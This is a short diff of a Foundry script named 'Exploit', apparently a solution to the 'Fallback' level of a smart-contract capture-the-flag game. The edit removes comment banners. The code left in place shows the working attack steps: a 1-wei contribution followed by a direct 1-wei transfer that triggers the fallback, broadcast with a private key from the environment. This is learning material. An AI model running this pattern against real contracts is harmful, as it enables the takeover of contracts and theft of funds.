@@ -8,9 +8,6 @@ import {Fallback} from "src/01/Fallback.sol";
 
 contract Exploit is Script {
 
-      ////////////////////////////////////////////
-      // CHANGE: add the current instance address
-      ///////////////////////////////////////////
       address instance = vm.envAddress("INSTANCE_LEVEL1");
       Fallback level = Fallback(payable(instance));
 
@@ -18,9 +15,6 @@ contract Exploit is Script {
 
           vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
-          //////////////////////////////
-          // Copy the exploit from test
-          //////////////////////////////
           level.contribute{value: 1 wei}();
           (bool sent, ) = address(level).call{value: 1 wei}("");
           require(sent, "Failed to call send()");
